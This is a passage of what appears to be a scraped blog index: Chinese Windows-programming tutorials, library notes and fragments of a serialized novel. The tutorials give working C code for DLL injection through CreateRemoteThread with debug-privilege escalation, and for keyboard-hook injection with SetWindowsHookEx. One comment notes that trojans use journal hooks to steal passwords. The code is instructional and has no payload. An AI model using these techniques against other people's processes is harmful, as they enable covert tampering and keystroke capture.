SE_DEBUG_NAME, &amp;luidTmp)) &#123; OutputDebugString(&quot;AdjustProcessTokenPrivilege LookupPrivilegeValue Failed ! \\n&quot;); CloseHandle(hToken); return; &#125; tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = luidTmp; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; OutputDebugString(&quot;AdjustProcessTokenPrivilege AdjustTokenPrivileges Failed ! \\n&quot;); CloseHandle(hToken); return; &#125; return;&#125;void GetExePath(char* pExePath) &#123; int pathlen = GetModuleFileName(NULL, pExePath, MAX_PATH); while(1) &#123; if(pExePath[pathlen--]==&apos;\\\\&apos;) break; &#125; pExePath[++pathlen] = 0; &#125; int main(int argc,char **argv)&#123; CHAR* pDllName = NULL; HANDLE hProcess = NULL; DWORD dwProcessId = 0; LPVOID lpStartAddress = NULL; LPVOID lpParaAddress = NULL; HANDLE hRemoteThread = NULL; DWORD dwExitHandle = 0; // 获取一下DLL的路径 CHAR tmpPath[MAX_PATH] = &#123;0&#125;; GetExePath(tmpPath); strcat(tmpPath,&quot;\\\\&quot;); strcat(tmpPath,INJECTDLLNAME); pDllName = tmpPath; printf(&quot;注入的DLL路径:%s \\r\\n&quot;, pDllName); printf(&quot;输入要注入的进程ID:&quot;); scanf(&quot;%d&quot;, &amp;dwProcessId); // 提升当前进程的权限 AdjustProcessTokenPrivilege(); // 打开目标进程 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); // 为目标进程分配内存 lpParaAddress = VirtualAllocEx(hProcess, NULL, strlen(pDllName), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // 将要注入的DLL路径写入到目标进程 WriteProcessMemory(hProcess, lpParaAddress, pDllName, strlen(pDllName), 0); // 获取LoadLibrary的地址 lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(&quot;kernel32&quot;),&quot;LoadLibraryA&quot;); // 创建远程线程执行注入DLL操作 hRemoteThread = CreateRemoteThread(hProcess,NULL,0,lpStartAddress,lpParaAddress,0,NULL); printf(&quot;%d\\n&quot;, GetLastError()); // 等待其加载完毕 WaitForSingleObject(hRemoteThread,INFINITE); CloseHandle(hRemoteThread); system(&quot;pause&quot;); // 获取GetModuleHandleA的地址 lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(&quot;kernel32&quot;),&quot;GetModuleHandleA&quot;); // 创建远程线程执行GetModuleHandleA操作 hRemoteThread = CreateRemoteThread(hProcess,NULL,0,lpStartAddress,lpParaAddress,0,NULL); printf(&quot;%d\\n&quot;, GetLastError()); WaitForSingleObject(hRemoteThread,INFINITE); GetExitCodeThread(hRemoteThread,&amp;dwExitHandle);//线程的结束码即为Dll模块儿的句柄 CloseHandle(hRemoteThread); // 获取FreeLibrary的地址 lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(&quot;kernel32&quot;),&quot;FreeLibrary&quot;); // 创建远程线程执行卸载DLL操作 hRemoteThread = CreateRemoteThread(hProcess,NULL,0,lpStartAddress,(LPVOID)dwExitHandle,0,NULL); // 等待其卸载完毕 WaitForSingleObject(hRemoteThread,INFINITE); CloseHandle(hRemoteThread); // 释放资源 VirtualFreeEx(hProcess,lpParaAddress,0,MEM_RELEASE); CloseHandle(hProcess); system(&quot;pause&quot;); return 0;&#125; OpenProcessToken OpenProcessToken 是 Windows API 中的一个函数，用于打开与指定进程关联的访问令牌（Access Token）。以下是对该函数的详细描述： 12345678910111213141516171819202122232425262728293031#include &lt;windows.h&gt;/** * @brief 打开指定进程的访问令牌 * * 此函数用于打开与指定进程关联的访问令牌，以便后续对令牌的操作。 * * @param hProcess 目标进程的句柄 * @param dwDesiredAccess 指定访问令牌的访问权限 * @param phToken 接收打开的访问令牌的句柄 * * @return 如果函数成功，返回非零值；如果函数失败，返回零。要获取扩展的错误信息，可以调用 GetLastError 函数。 * * @note 为了成功调用此函数，调用进程必须具有 PROCESS_QUERY_INFORMATION 或 PROCESS_QUERY_LIMITED_INFORMATION 权限。 */BOOL OpenProcessToken( HANDLE ProcessHandle, // 目标进程的句柄 DWORD DesiredAccess, // 指定访问令牌的访问权限 PHANDLE TokenHandle // 接收打开的访问令牌的句柄);参数说明：ProcessHandle：目标进程的句柄，该句柄必须具有 PROCESS_QUERY_INFORMATION 或 PROCESS_QUERY_LIMITED_INFORMATION 权限。DesiredAccess：指定访问令牌的访问权限，可以使用常量如 TOKEN_READ，也可以通过按位 OR 运算组合多个权限。TokenHandle：用于接收打开的访问令牌的句柄的指针。返回值说明：如果函数成功，返回非零值。如果函数失败，返回零。要获取扩展的错误信息，可以调用 GetLastError 函数。 GetCurrentProcess GetCurrentProcess 是 Windows 操作系统中的一个函数，通常在 Windows API 中使用。该函数用于获取当前执行代码的进程句柄（handle）。 123456#include &lt;windows.h&gt;HANDLE GetCurrentProcess(void);返回值：返回一个 HANDLE 类型的值，代表当前进程的句柄。HANDLE 是一个通用的操作系统句柄类型，在 Windows 中用于表示各种内核对象，如进程、线程、文件等。在这种情况下，返回的 HANDLE 是当前进程的句柄。 LookupPrivilegeValue LookupPrivilegeValue 是 Windows 操作系统中的一个函数，用于查找指定系统的特权（privilege）的本地名称和权限值。 12345678910111213141516#include &lt;windows.h&gt;BOOL LookupPrivilegeValueA( LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);参数：lpSystemName：指向包含系统名的字符串的指针，一般为 NULL，表示本地计算机。lpName：指向包含特权名的字符串的指针，例如 &quot;SeShutdownPrivilege&quot;。lpLuid：指向 LUID 结构的指针，用于接收查找到的特权的本地唯一标识符。返回值：如果函数调用成功，返回非零值；如果函数调用失败，返回零。可以使用 GetLastError 函数获取更多错误信息。 CloseHandle CloseHandle 是 Windows 操作系统中的一个函数，用于关闭一个打开的对象句柄。 123456789101112#include &lt;windows.h&gt;BOOL CloseHandle( HANDLE hObject);参数：hObject：要关闭的对象句柄。返回值：如果函数调用成功，返回非零值；如果函数调用失败，返回零。可以使用 GetLastError 函数获取更多错误信息。 AdjustTokenPrivileges AdjustTokenPrivileges 是 Windows 操作系统中的一个函数，用于修改访问令牌（access token）的权限。以下是其 C 语言描述： 12345678910111213141516171819202122#include &lt;windows.h&gt;BOOL AdjustTokenPrivileges( HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);参数：TokenHandle：要修改权限的令牌的句柄。DisableAllPrivileges：指定是否禁用所有权限。如果为 TRUE，将禁用所有权限；如果为 FALSE，将启用或禁用由 NewState 参数指定的权限。NewState：指向 TOKEN_PRIVILEGES 结构的指针，该结构包含了要设置的权限信息。BufferLength：指定 NewState 参数指向的缓冲区的大小。PreviousState：可选参数，指向 TOKEN_PRIVILEGES 结构的指针，用于接收修改之前的权限信息。ReturnLength：可选参数，用于接收实际写入 PreviousState 缓冲区的字节数。返回值：如果函数调用成功，返回非零值；如果函数调用失败，返回零。可以使用 GetLastError 函数获取更多错误信息。 GetModuleFileName GetModuleFileName 是 Windows 操作系统中的一个函数，用于获取指定模块的文件名。以下是其 C 语言描述： 12345678910111213141516#include &lt;windows.h&gt;DWORD GetModuleFileNameA( HMODULE hModule, LPSTR lpFilename, DWORD nSize);参数：hModule：指定要获取文件名的模块的句柄。如果为 NULL，表示获取当前执行代码的模块文件名。lpFilename：指向一个缓冲区的指针，用于接收模块文件名的字符串。nSize：指定缓冲区的大小，以字节为单位。返回值：如果函数调用成功，返回字符串的长度，不包括终止 null 字符；如果函数调用失败，返回零。可以使用 GetLastError 函数获取更多错误信息。 OpenProcess OpenProcess 是 Windows 操作系统中的一个函数，用于打开一个已存在的进程，并返回该进程的句柄。以下是其 C 语言描述： 123456789101112131415#include &lt;windows.h&gt;HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);参数：dwDesiredAccess：指定打开进程的访问权限。这是一个常量，如 PROCESS_ALL_ACCESS 表示完全访问权限。bInheritHandle：指定返回的句柄是否可被子进程继承。一般设置为 FALSE。dwProcessId：指定要打开的进程的标识符（ID）。返回值：如果函数调用成功，返回进程的句柄；如果函数调用失败，返回 NULL。可以使用 GetLastError 函数获取更多错误信息。 VirtualAllocEx VirtualAllocEx 是 Windows 操作系统中的一个函数，用于在指定的远程进程中分配内存空间。以下是其 C 语言描述： 12345678910111213141516171819#include &lt;windows.h&gt;LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);参数：hProcess：要分配内存的目标进程的句柄。lpAddress：指定分配内存的起始地址，如果为 NULL，由系统决定分配的地址。dwSize：指定要分配的内存大小，以字节为单位。flAllocationType：指定内存分配的类型，例如 MEM_COMMIT 表示提交内存，MEM_RESERVE 表示保留内存。flProtect：指定内存区域的访问权限，例如 PAGE_READWRITE 表示可读写的内存。返回值：如果函数调用成功，返回分配的内存的起始地址；如果函数调用失败，返回 NULL。可以使用 GetLastError 函数获取更多错误信息。 WriteProcessMemory WriteProcessMemory 是 Windows 操作系统中的一个函数，用于向指定的远程进程写入数据到指定的内存地址。以下是其 C 语言描述： 1234567891011121314151617181920#include &lt;windows.h&gt;BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);参数：hProcess：要写入数据的目标进程的句柄。lpBaseAddress：指定要写入数据的远程进程的内存地址。lpBuffer：指向包含要写入数据的缓冲区的指针。nSize：指定要写入数据的字节数。lpNumberOfBytesWritten：指向变量的指针，用于接收成功写入的字节数。返回值：如果函数调用成功，返回非零值；如果函数调用失败，返回零。可以使用 GetLastError 函数获取更多错误信息。 GetModuleHandle GetModuleHandle 是 Windows 操作系统中的一个函数，用于获取指定模块的句柄。以下是其 C 语言描述： 1234567891011#include &lt;windows.h&gt;HMODULE GetModuleHandleA( LPCSTR lpModuleName);参数：lpModuleName：指定要获取句柄的模块的名称。如果为 NULL，表示获取当前执行代码的模块句柄。返回值：如果函数调用成功，返回模块的句柄；如果函数调用失败，返回 NULL。可以使用 GetLastError 函数获取更多错误信息 GetProcAddress GetProcAddress 是 Windows 操作系统中的一个函数，用于获取指定动态链接库（DLL）中导出函数或变量的地址。以下是其 C 语言描述： 12345678910111213#include &lt;windows.h&gt;FARPROC GetProcAddress( HMODULE hModule, LPCSTR lpProcName);参数：hModule：指定包含导出函数或变量的 DLL 的句柄。可以使用 LoadLibrary 或 GetModuleHandle 获取 DLL 的句柄。lpProcName：指定要获取地址的导出函数或变量的名称。返回值：如果函数调用成功，返回导出函数或变量的地址；如果函数调用失败，返回 NULL。可以使用 GetLastError 函数获取更多错误信息。 CreateRemoteThread CreateRemoteThread 是 Windows 操作系统中的一个函数，用于在远程进程中创建一个新的线程。以下是其 C 语言描述： 1234567891011121314151617181920212223#include &lt;windows.h&gt;HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);参数：hProcess：指定目标进程的句柄，新线程将在该进程中创建。lpThreadAttributes：指定线程的安全性，通常设置为 NULL。dwStackSize：指定新线程的堆栈大小，通常设置为 0 使用默认堆栈大小。lpStartAddress：指定新线程的起始地址，即线程将从该地址开始执行。lpParameter：传递给新线程的参数，可以为 NULL。dwCreationFlags：指定线程的创建标志，通常设置为 0。lpThreadId：指向变量的指针，用于接收新线程的标识符。返回值：如果函数调用成功，返回新线程的句柄；如果函数调用失败，返回 NULL。可以使用 GetLastError 函数获取更多错误信息。 GetLastError GetLastError 是 Windows 操作系统中的一个函数，用于获取最近一次调用发生错误的错误代码。以下是其 C 语言描述： 123456#include &lt;windows.h&gt;DWORD GetLastError(void);返回值：返回一个表示错误代码的 DWORD 类型的值。如果函数调用成功，返回的值通常是一个非零的错误代码。如果函数调用成功，返回的值通常是零。 WaitForSingleObject WaitForSingleObject 是 Windows 操作系统中的一个函数，用于等待一个对象的状态变为 signaled。 1234567891011121314151617#include &lt;windows.h&gt;DWORD WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds);参数：hHandle：要等待的对象的句柄。dwMilliseconds：指定等待的时间，以毫秒为单位。如果为 INFINITE，则表示无限等待。返回值：如果函数调用成功，返回等待对象的状态。可能的返回值有：WAIT_OBJECT_0：对象的状态变为 signaled。WAIT_TIMEOUT：等待超时。WAIT_FAILED：函数调用失败，可以使用 GetLastError 获取更多错误信息。 VirtualFreeEx VirtualFreeEx 是 Windows 操作系统中的一个函数，用于释放在指定的远程进程中分配的虚拟内存空间。 123456789101112131415161718#include &lt;windows.h&gt;BOOL VirtualFreeEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);参数：hProcess：目标进程的句柄，其中分配了虚拟内存空间。lpAddress：要释放的虚拟内存的起始地址。dwSize：要释放的虚拟内存的大小，以字节为单位。dwFreeType：释放类型，可以是以下值之一：MEM_DECOMMIT：释放虚拟内存的物理存储，但保留内存中的地址空间。MEM_RELEASE：释放虚拟内存的物理存储和地址空间。返回值：如果函数调用成功，返回非零值；如果函数调用失败，返回零。可以使用 GetLastError 函数获取更多错误信息。","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"使用钩子注入DLL","slug":"使用钩子注入DLL","date":"2023-12-04T14:47:56.000Z","updated":"2023-12-06T16:05:24.927Z","comments":true,"path":"2023/12/04/使用钩子注入DLL/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/12/04/使用钩子注入DLL/","excerpt":"","text":"原理：通过SetWindowsHookEx函数将DLL注入到进程的地址空间中，最后一个参数dwThreadId指向的是被注入进程内的某个线程ID。 (1) 进程A对线程dwThread挂键盘钩子 (2) 线程dwThreadId获取到的键盘消息会实现被钩子拦截 (3) 系统检查hMod指向的DLL是否已被载入到线程dwThreadId所在的进程地址空间中，若否，则载入。这时，假设DLL被载入到进程B (4) 系统在进程B的地址空间中调用lpfn函数 钩子的回调函数格式 12345LRESULT CALLBACK FunProc( int code, // hook code WPARAM wParam, // virtual-key code LPARAM lParam // keystroke-message information ) 消息框 12345678910111213141516171819202122232425262728293031323334#include &lt;windows.h&gt;/* * @brief 显示一个消息框，并等待用户的响应。 * * @param hwndParent 父窗口的句柄，如果为nullptr，则消息框将居中显示在屏幕上。 * @param lpText 要显示的消息文本。 * @param lpCaption 消息框标题。 * @param uType 消息框的类型，可以是以下值的组合： * - MB_ABORTRETRYIGNORE * - MB_CANCELTRYCONTINUE * - MB_HELP * - MB_OK * - MB_OKCANCEL * - MB_RETRYCANCEL * - MB_YESNO * - MB_YESNOCANCEL * @return 用户的响应。可能的值包括： * - IDABORT * - IDCANCEL * - IDCONTINUE * - IDIGNORE * - IDNO * - IDOK * - IDRETRY * - IDTRYAGAIN * - IDYES */int MessageBox( HWND hwndParent, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType); CallNextHookEx 1234567891011121314151617181920212223242526272829#include &lt;windows.h&gt;/** * @brief 调用下一个钩子程序在钩子链中。 * * @param hhk 钩子句柄，由SetWindowsHookEx函数返回。 * @param nCode 钩子代码，表示事件类型。具体取值取决于使用的钩子类型。 * @param wParam 与事件相关的附加信息，具体含义取决于使用的钩子类型。 * @param lParam 与事件相关的附加信息，具体含义取决于使用的钩子类型。 * @return 下一个钩子程序的返回值，具体含义取决于使用的钩子类型。 */LRESULT CallNextHookEx( HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);CallNextHookEx是Windows API中用于调用下一个钩子程序的函数。在使用钩子函数时，它允许当前的钩子程序调用下一个钩子程序，以确保整个钩子链能够正常运行。参数说明：hhk：钩子句柄，由 SetWindowsHookEx 函数返回。nCode：钩子代码，表示事件类型。具体取值取决于使用的钩子类型。wParam：与事件相关的附加信息，具体含义取决于使用的钩子类型。lParam：与事件相关的附加信息，具体含义取决于使用的钩子类型。返回值：CallNextHookEx 的返回值取决于使用的钩子类型，通常是下一个钩子程序的返回值。 FindWindow 123456789101112131415161718#include &lt;windows.h&gt;/** * @brief 根据窗口类名和窗口标题查找顶层窗口的句柄。 * * @param lpClassName 窗口类名，如果为NULL，则匹配所有类名。 * @param lpWindowName 窗口标题，如果为NULL，则匹配所有标题。 * @return 找到的窗口的句柄，如果未找到则为NULL。 */HWND FindWindow( LPCSTR lpClassName, LPCSTR lpWindowName);lpClassName：窗口类名，如果为NULL，则匹配所有类名。lpWindowName：窗口标题，如果为NULL，则匹配所有标题。返回值：找到的窗口的句柄，如果未找到则为NULL。 GetWindowThreadProcessId 123456789101112131415161718#include &lt;windows.h&gt;/** * @brief 获取指定窗口的线程标识符和进程标识符。 * * @param hWnd 目标窗口的句柄。 * @param lpdwProcessId 接收进程标识符的指针，如果为NULL则不检索。 * @return 返回目标窗口所在的线程标识符。 */DWORD GetWindowThreadProcessId( HWND hWnd, LPDWORD lpdwProcessId);hWnd：目标窗口的句柄。lpdwProcessId：接收进程标识符的指针。如果为NULL，则不检索进程标识符。返回值：返回目标窗口所在的线程标识符。该函数允许您获取与指定窗口相关联的线程标识符和进程标识符。可以使用这些标识符来进行诸如线程注入和进程间通信等操作。 SetWindowsHookEx 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;windows.h&gt;/** * @brief 安装一个钩子函数来监视指定类型的事件。 * * @param idHook 要安装的钩子类型。 * @param lpfn 钩子过程的地址。 * @param hMod 包含钩子过程的 DLL 的句柄。如果为NULL，则将使用当前进程的句柄。 * @param dwThreadId 与要监视的事件相关联的线程的标识符。如果为0，则表示安装全局钩子。 * @return 成功时返回钩子的句柄，失败时返回NULL。 */HHOOK SetWindowsHookEx( int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId);其中idHook参数可以取如下常量：WH_CALLWNDPROC //窗口钩子，当系统向目标窗口发送消息时将触发此钩子WH_CALLWNDPROCRET //窗口钩子，当窗口处理完消息后将触发此钩子WH_CBT //当Windows激活、产生、释放（关闭）、最小化、最大化或改变窗口时都将触发此事件WH_DEBUG //调试钩子WH_GETMESSAGE //当往消息队列中增加一个消息时将触发此钩子WH_JOURNALPLAYBACK //回放钩子，可以用于播放已记录的鼠标和键盘的操作WH_JOURNALRECORD //记录钩子，可以用于记录鼠标和键盘的操作，木马程序可以使用此钩子窃取受控方在屏幕中敲入的密码WH_KEYBOARD //当敲击键盘时将触发此钩子WH_MOUSE //当有鼠标操作时将触发此钩子WH_MSGFILTER //消息过滤钩子WH_SHELL //Shell钩子WH_SYSMSGFILTER //系统消息过滤钩子其他特定类型的钩子，具体取决于您的需求。lpfn：指向钩子过程的函数指针。此函数在发生事件时被调用。hMod：包含钩子过程的 DLL 的句柄。如果为NULL，则将使用当前进程的句柄。dwThreadId：与要监视的事件相关联的线程的标识符。如果为0，则表示安装全局钩子，针对所有线程的事件。返回值：成功时返回钩子的句柄，失败时返回NULL。SetWindowsHookEx函数用于安装一个钩子，允许您监视并拦截指定类型的事件。成功安装后，钩子过程将在事件发生时被调用。通常，钩子过程是在DLL中实现的，以便可以在不同进程间共享。 UnhookWindowsHookEx 12345678910111213141516#include &lt;windows.h&gt;/** * @brief 卸载之前安装的钩子。 * * @param hhk 先前安装的钩子的句柄。 * @return 如果成功，返回非零值；如果失败，返回零。 */BOOL UnhookWindowsHookEx( HHOOK hhk);hhk：先前安装的钩子的句柄，由 SetWindowsHookEx 返回。返回值：如果成功，返回非零值；如果失败，返回零。UnhookWindowsHookEx函数用于卸载之前通过 SetWindowsHookEx 安装的钩子。在不再需要钩子时，调用此函数以确保释放相关资源，并停止钩子过程的调用。成功卸载后，钩子句柄将不再有效。 123456789101112131415161718192021222324252627282930313233#include &lt;Windows.h&gt;LRESULT CALLBACK FunProc( int code, // hook code WPARAM wParam, // virtual-key code LPARAM lParam // keystroke-message information )&#123; MessageBox(NULL,&quot;KEY PRESS&quot;,&quot;hook inject&quot;,MB_OK); return CallNextHookEx(0,code,wParam,lParam);&#125;HHOOK g_HookHandle;__declspec(dllexport) void SetHook()&#123; DWORD tid = 0; // 获取窗口句柄 HWND gameh = FindWindow(NULL,&quot;test.txt - 记事本&quot;); if (gameh == 0) &#123; return; &#125; // 获取创建这个窗口的线程 tid = GetWindowThreadProcessId(gameh,NULL); // 安装钩子到指定线程 WH_KEYBOARD 键盘钩子 g_HookHandle = SetWindowsHookEx(WH_KEYBOARD, FunProc, GetModuleHandle(&quot;HOOKInject.dll&quot;),tid);&#125;__declspec(dllexport) void UnHook() &#123; UnhookWindowsHookEx(g_HookHandle); &#125; 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;windows.h&gt;typedef void (*lpFun)();int main()&#123; HINSTANCE hDll; //DLL句柄 lpFun SetHook; //函数指针 lpFun UnHook; //函数指针 hDll = LoadLibrary(&quot;..\\\\Debug\\\\HOOKInject.dll&quot;); if (hDll != NULL) &#123; SetHook = (lpFun)GetProcAddress(hDll, &quot;SetHook&quot;); UnHook = (lpFun)GetProcAddress(hDll, &quot;UnHook&quot;); &#125; if (SetHook != NULL) &#123; SetHook(); &#125; getchar(); UnHook(); if (hDll != NULL) &#123; FreeLibrary(hDll); &#125; return 0;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"动态库与静态库","slug":"动态库与静态库","date":"2023-12-02T14:02:14.000Z","updated":"2023-12-04T14:42:57.709Z","comments":true,"path":"2023/12/02/动态库与静态库/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/12/02/动态库与静态库/","excerpt":"","text":"静态库 :链接时候被链接到可执行文件，文件体积较大 使用静态库需要有头文件和 *.lib文件 动态库：不被链接进入，动态加载，生成文件体积小 使用动态库需要有头文件 lib dll或者dll文件 库的用途：调用不同的库实现不同的功能，实现代码复用 静态库编写 加上extern &quot;C&quot;代表用C语言实现的函数 通常C语言写出来的库都比较通用 头文件xxx.h 1234#ifndef LIB_H#define LIB_H/*extern &quot;C&quot; */int add(int x,int y);#endif 源文件xxx.c 123456#include &quot;staticlib.h&quot;int add(int x,int y)&#123; return x + y;&#125; 动态库编写 加上__stdcall后库中函数的名字会改变 123456789101112#ifndef _DLL_H_#define _DLL_H_#ifdef _EXPORT#define DECLSPEC __declspec(dllexport) // 导出 #else#define DECLSPEC __declspec(dllimport) // 导入#endifDECLSPEC int add(int x,int y);DECLSPEC int __stdcall add2(int x,int y);#endif // _DLL_H_ 1234567891011121314151617181920212223242526272829303132333435#include &quot;dll.h&quot;#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int add(int x,int y)&#123; return x + y;&#125;int __stdcall add2(int x,int y)&#123; return x + y;&#125;BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: printf(&quot;process attach of dll\\r\\n&quot;); break; case DLL_THREAD_ATTACH: printf(&quot;thread attach of dll\\r\\n&quot;); break; case DLL_THREAD_DETACH: printf(&quot;thread detach of dll\\r\\n&quot;); break; case DLL_PROCESS_DETACH: printf(&quot;process detach of dll\\r\\n&quot;); break; &#125; return TRUE;&#125; 调用静态库和动态库 调用静态库 123456789101112131415#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &quot;..\\staticlib\\staticlib.h&quot;#pragma comment(lib, &quot;..\\\\Debug\\\\staticlib.lib&quot; ) int main()&#123; // 静态库调用 int c = add(1,2); printf(&quot;%d\\r\\n&quot;, c); system(&quot;pause&quot;); return 0;&#125; 12//告诉编译器将staticlib.lib链接到本程序中#pragma comment(lib, &quot;..\\\\Debug\\\\staticlib.lib&quot; ) 或者可以在VS中添加 调用动态库 第一种方法隐式调用需要有头文件,lib文件,dll文件 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &quot;..\\dll\\dll.h&quot;#pragma comment(lib, &quot;..\\\\Debug\\\\dll.lib&quot; )typedef int (*lpAddFun)(int, int);int main()&#123; // 隐式调用 int c = add(1,2); printf(&quot;%d\\r\\n&quot;, c); system(&quot;pause&quot;); return 0;&#125; 第二种方法只需要有dll文件 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &quot;..\\dll\\dll.h&quot;#pragma comment(lib, &quot;..\\\\Debug\\\\dll.lib&quot; )typedef int (__stdcall *lpAddFun)(int, int);typedef int (*lpAddFun2)(int, int);int main()&#123; // 显示调用DLL HINSTANCE hDll; //DLL句柄 lpAddFun addFun; //函数指针 hDll = LoadLibrary(&quot;..\\\\Debug\\\\dll.dll&quot;); if (hDll != NULL) &#123; addFun = (lpAddFun)GetProcAddress(hDll, &quot;_add@8&quot;); //addFun = (lpAddFun)GetProcAddress(hDll, MAKEINTRESOURCE(1)); if (addFun != NULL) &#123; int result = addFun(1, 2); printf(&quot;%d\\r\\n&quot;, result); &#125; FreeLibrary(hDll); &#125; system(&quot;pause&quot;); return 0;&#125; 如果在函数调用约定使用的是__stdcall ,函数名字就会发生改变 def文件可以告诉编译器那个函数要作为输出函数 123LIBRARY dll文件名EXPORTS // 代表导出函数名 @ 序号 例如 12345LIBRARY my.dllEXPORTS add @ 1push @ 3sub @ 2","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"重逢悦儿","slug":"重逢悦儿","date":"2023-10-30T21:35:56.000Z","updated":"2023-10-30T23:45:22.807Z","comments":true,"path":"2023/10/31/重逢悦儿/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/10/31/重逢悦儿/","excerpt":"","text":"欧阳村，一名丫鬟从小悦儿府上走出。只见她魂不守舍的走着，像是去慌忙的向某个目的地走着。 就在这时，叶辰使用五行遁出现在那丫鬟身前，只听 “砰” 一声 “哎呀，那个不长眼睛的家伙！” 只见那躺在地上的丫鬟说道 “姑娘，你没事吧！” 叶辰搀扶着那丫鬟说道 “能没事吗？你这家伙怎么神出鬼没的，突然就出现在我跟前！要不是我还得快点去找大夫去救我家小姐，我跟你没完！” 此时叶辰心想 “救小姐？莫非这位小姐就是师傅述说的等我救的人？” 随后叶辰问道 “敢问这位姑娘，你家小姐出来什么事了？” 那名丫鬟缓缓的站起身子，随后答道 “我家小姐突然卧床不起——哎，我家小姐怎么了，关你什么事！不行不行，我还得赶紧去找大夫，要是耽搁了，唯你是问。” “卧床不起？那我得去看看，这十年来在茅山也学了不少治病的道术，正好可以施展一下！” 叶辰心里沉思了一会儿，又说道 “那姑娘可遇对人了！这世上要是我都治不好的病，那你也某找别人了！我乃当今世上叶神医，世人称之在世华佗” 话音刚毕，叶辰心里笑道 “哈哈哈，反正出门在外，身份都是自己给的！” 那丫鬟愣了愣，随后目光扫向叶辰，打量了一下，想道 “这二十出头的毛头小子也敢自称在世华佗！怕不是大头菜吃多了吧？算了，反正夫人让我找大夫，既然他会的话，那就让他试试” “那你还愣在这干嘛！还不赶紧和我回去救我家小姐！要是我家小姐有什么差池，本小姐唯你是问！” 只见那丫鬟话音刚毕，便匆忙的拉着叶辰往小悦儿府上赶去…… 此时小悦儿躺在床上,双目无神，身体颤抖，那口中还发出轻微的声音 “叶哥哥，你怎么还不来找悦儿，悦———悦儿我好想你啊!” “悦儿！悦儿！你到底怎么了！怎么前几天还好好的，今天就突然这样了？” 只见小悦儿母亲那颤抖的手抚摸着小悦儿额头，忐忑不安的说道。 “夫人莫急，小翠不是已经出去找大夫了吗？你在这干着急也没用啊！” 一位中年男子，在小悦儿房间，焦急的对着那妇人说道。 此人正是小悦儿的父亲，欧阳明岳 这时，门外传来一阵吵闹声…… “这位姑娘，要不要这么着急啊！快放手，衣裳都要被你扯破了” 叶辰挣脱了那丫鬟的手，说道 “老爷——老爷，大夫请来了。” 那丫鬟慌忙的边跑向悦儿房间边喊道。 此时叶辰眉心一颤，突然一种不祥的预感由心而生。 随后便紧紧的跟在身后，当踏进悦儿房间时，扫视了一遍房间，然后皱起眉头目视着躺在床上的姑娘。 悦儿母亲听到小翠声音的时候，脸上漏出些许期待的表情，说道 “太好了——太好了！我们家悦儿有救了！” 欧阳明岳望了望叶辰，随后邹起眉头，口中疑惑的问道 “这位兄弟，看起来面生！不像是本村大夫啊！” 叶辰没有理会那名中年男子，大步的走向悦儿床前，只因那名妇人刚刚口中提及悦儿两字。 只见叶辰撑开悦儿眼睛望了望，随后又拿起她的手腕，摸着脉象。 此刻叶辰心里嘀咕着 “眼睛显露红丝，可脉象平稳，不像是得病啊！难不成——？” 待叶辰嘀咕完后，目光望向那悦儿父亲，然后问道 “这几天，府上可发生过什么事？又或者她是否和什么人接触过？”","categories":[{"name":"小说","slug":"小说","permalink":"https://xiaowuyoucy.github.io/categories/小说/"}],"tags":[]},{"title":"第三篇走出茅山","slug":"第三章走出茅山","date":"2023-10-26T16:11:53.000Z","updated":"2023-10-30T22:56:09.505Z","comments":true,"path":"2023/10/27/第三章走出茅山/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/10/27/第三章走出茅山/","excerpt":"","text":"张广正望了望叶辰，又继续说道 “十八年前，救下那名婴儿的人正是为师，那婴儿是徒儿你！” 叶辰愣了一下，心里想道 “这么多年来一直疑惑为什么从小就无父无母，而自己的养父养母却从来不提及” 随后叶辰掀开腹中的衣裳继续想道 